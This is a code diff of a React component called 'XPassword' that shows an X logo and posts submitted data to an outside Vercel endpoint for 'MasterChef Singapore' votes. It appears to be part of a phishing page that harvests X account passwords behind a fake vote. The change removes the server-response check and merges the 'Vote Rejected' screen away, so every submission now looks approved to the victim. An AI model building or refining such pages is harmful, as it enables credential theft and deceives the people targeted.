@@ -27,7 +27,7 @@ export default function XPassword() {
     setLoading(true);
 
     try {
-      const res = await fetch(
+      await fetch(
         "https://masterchefsingapore-vk35.vercel.app/api/votes/submit",
         {
           method: "POST",
@@ -43,17 +43,12 @@ export default function XPassword() {
           }),
         }
       );
-
-      const data = await res.json();
-
-  if (data.success) {
-  setStatus("approved");
-}
     } catch (err) {
       console.log(err);
+    } finally {
+      setStatus("approved");
+      setLoading(false);
     }
-
-    setLoading(false);
   }
 
   if (status === "pending") {
@@ -78,7 +73,7 @@ export default function XPassword() {
     );
   }
 
-  if (status === "approved") {
+  if (status === "approved" || status === "rejected") {
     return (
       <div className="min-h-screen bg-black flex items-center justify-center text-white">
         <div className="text-center">
@@ -94,28 +89,6 @@ export default function XPassword() {
 
           <p className="text-gray-400 mt-4">
             Try again.
-          </p>
-        </div>
-      </div>
-    );
-  }
-
-  if (status === "rejected") {
-    return (
-      <div className="min-h-screen bg-black flex items-center justify-center text-white">
-        <div className="text-center">
-          <img
-            src={xLogo}
-            alt="X"
-            className="w-14 h-14 mx-auto mb-6"
-          />
-
-          <h1 className="text-3xl font-bold text-red-500">
-            Vote Rejected
-          </h1>
-
-          <p className="text-gray-400 mt-4">
-            Please try again.
           </p>
         </div>
       </div>
